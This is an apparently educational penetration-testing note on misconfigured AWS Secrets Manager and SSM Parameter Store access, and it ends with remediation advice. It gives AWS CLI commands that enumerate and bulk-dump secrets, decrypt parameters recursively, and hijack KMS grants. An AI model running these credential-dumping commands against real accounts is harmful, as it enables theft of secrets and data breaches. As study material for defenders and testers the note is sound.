---
tags: [aws, secrets, credentials, secretsmanager, ssm]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.06 AWS SecretsManager"
---

# AWS Secrets Manager & Parameter Store — Misconfigured Access

## 1. Introduction to Secret Management in AWS
Modern cloud applications require access to databases, third-party APIs, and cryptographic keys. Hardcoding these secrets in source code or configuration files is a major security flaw. AWS provides two primary services to manage these secrets securely:
- **AWS Secrets Manager**: Purpose-built for storing, rotating, and managing lifecycle of secrets (e.g., RDS database credentials).
- **AWS Systems Manager (SSM) Parameter Store**: A centralized store for configuration data and secrets. Provides secure string capabilities using AWS KMS.

While these services are inherently secure, misconfigurations in IAM policies or resource-based policies often allow attackers who have gained a foothold in the environment to dump all stored secrets.

## 2. ASCII Architecture Diagram: Secrets Exfiltration Flow

```text
  [ Compromised Entity ]
  (e.g., EC2, Lambda, or stolen IAM user keys)
           |
           |  1. Attacker enumerates available secrets
           |     aws secretsmanager list-secrets
           v
  [ AWS Secrets Manager API ]
           |
           |  2. Returns list of Secret ARNs
           |     - arn:aws:secretsmanager:...:secret:ProdDB
           |     - arn:aws:secretsmanager:...:secret:StripeAPIKey
           v
  [ Attacker ]
           |
           |  3. Attacker requests secret value
           |     aws secretsmanager get-secret-value --secret-id ProdDB
           v
  [ IAM & KMS Policy Evaluation ]
           |
           |  4. Check IAM: secretsmanager:GetSecretValue ? (Allow)
           |  5. Check KMS: kms:Decrypt on CMK ? (Allow)
           v
  [ Secret Exfiltrated ]
           |
           |  6. Database credentials exposed
           v
  [ Data Breach / Lateral Movement ]
```

## 3. The Anatomy of Secret Access
Retrieving a secure string from SSM Parameter Store or Secrets Manager actually requires two distinct sets of permissions:
1. **Service Permission**: `secretsmanager:GetSecretValue` or `ssm:GetParameter` / `ssm:GetParametersByPath`.
2. **KMS Permission**: If the secret is encrypted with a Customer Managed Key (CMK), the principal must also have the `kms:Decrypt` permission for that specific KMS key. If encrypted with the AWS managed key (`aws/secretsmanager`), KMS permissions are handled transparently, making it easier for an attacker if they only possess the service permission.

## 4. Common Misconfigurations and Exploitation

### 4.1. Overly Permissive IAM Policies (`*` Access)
The most common vulnerability is a developer attaching a broad policy to an EC2 instance role or Lambda execution role to "make things work."
- **Vulnerable Policy**:
  ```json
  {
      "Effect": "Allow",
      "Action": [
          "secretsmanager:Get*",
          "secretsmanager:List*"
      ],
      "Resource": "*"
  }
  ```
- **Exploitation**: An attacker who compromises this role (e.g., via SSRF on the EC2 instance) can dump the entire vault.
  ```bash
  # Step 1: List all secrets
  aws secretsmanager list-secrets

  # Step 2: Loop through and dump values
  for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
      aws secretsmanager get-secret-value --secret-id $secret
  done
  ```

### 4.2. SSM Parameter Store Dumping
Similarly, if a role has access to SSM Parameter Store, an attacker can dump secure strings.
- **Exploitation**:
  ```bash
  # Step 1: Describe parameters
  aws ssm describe-parameters

  # Step 2: Get parameter value with decryption
  aws ssm get-parameter --name "/prod/db/password" --with-decryption
  ```
  Attackers often use `get-parameters-by-path` to recursively dump entire directories of secrets:
  ```bash
  aws ssm get-parameters-by-path --path "/prod/" --with-decryption --recursive
  ```

### 4.3. Resource-Based Policies on Secrets
Secrets Manager supports resource-based policies directly attached to the secret. A misconfigured resource policy might grant access to external AWS accounts or overly broad principals.
- **Exploitation**: If a secret allows access to `*` or a broad AWS organization ID, any user in that organization can read the secret, bypassing identity-based least privilege.

## 5. Post-Exploitation: Leveraging Stolen Secrets
Once secrets are dumped, the attacker pivots. Common findings include:
- **RDS Database Credentials**: Allows the attacker to connect directly to the database (if publicly accessible or accessed from within the VPC via a compromised jumpbox) and exfiltrate PII/PHI.
- **Third-Party API Keys**: Keys for SendGrid, Twilio, Stripe, or GitHub. These allow the attacker to send phishing emails from the company domain, execute financial fraud, or access source code repositories.
- **Cross-Account AWS IAM Access Keys**: Developers sometimes store long-term IAM access keys for *other* AWS accounts in Secrets Manager. This allows the attacker to immediately compromise a secondary AWS environment.

## 6. Advanced Vector: KMS Key Hijacking
If an attacker cannot read the secret because they lack `kms:Decrypt`, but they possess `kms:PutKeyPolicy` or `kms:CreateGrant`, they can modify the KMS key policy to grant themselves decryption rights.
- **Exploitation**:
  ```bash
  aws kms create-grant \
      --key-id arn:aws:kms:us-east-1:123456789012:key/abcd... \
      --grantee-principal arn:aws:iam::123456789012:role/CompromisedRole \
      --operations Decrypt
  ```
  Once the grant is created, the attacker can retrieve and decrypt the secret.

## 7. Reconnaissance Tools
During a penetration test, automated tools are used to quickly identify and dump accessible secrets:
- **Pacu**: Modules like `secretsmanager__enum` and `ssm__enum` will automatically list and attempt to decrypt all accessible secrets.
- **CloudFox**: Excellent for mapping out who has access to what secrets, identifying the precise IAM roles that need to be compromised to access a specific high-value secret.

## 8. Remediation and Best Practices
1. **Strict Resource Scoping**: IAM policies granting access to secrets must specify the exact ARN of the secret. Never use `Resource: "*"`.
2. **Use Customer Managed Keys (CMKs)**: Encrypt secrets with CMKs rather than the default AWS managed keys. This enforces a dual-authorization check (IAM + KMS), adding a significant layer of defense-in-depth.
3. **ABAC (Attribute-Based Access Control)**: Use tags to manage access. For example, ensure an IAM role tagged `Environment: Dev` can only read secrets tagged `Environment: Dev`.
4. **Audit and Rotation**: Enable CloudTrail data events to monitor `GetSecretValue` API calls. Use Secrets Manager's built-in rotation capability to automatically rotate database credentials every 30 days.

## 9. Conclusion
Secrets Manager and SSM Parameter Store act as the digital vaults of a cloud environment. While they solve the hardcoded secrets problem, they centralize risk. A single overly permissive IAM policy attached to a vulnerable application can lead to the instantaneous compromise of every secret the organization holds.

---

## Chaining Opportunities
- **[[03 - AWS EC2 — Metadata Service (IMDS) Exploitation]]**: An EC2 SSRF provides the initial execution context and IAM credentials needed to query Secrets Manager.
- **[[01 - AWS IAM — Roles, Policies, Misconfigurations]]**: Privilege escalation is often the precursor to dumping secrets. An attacker escalates to Admin, then immediately dumps the parameter store.
- **[[04 - AWS Lambda — Privilege Escalation, Event Injection]]**: Exploiting a Lambda function often yields an execution role that possesses read access to specific high-value secrets.

## Related Notes
- [[02 - AWS S3 — Public Access, ACL Misconfiguration]]
- [[05 - AWS ECS EKS — Container Privilege Escalation]]
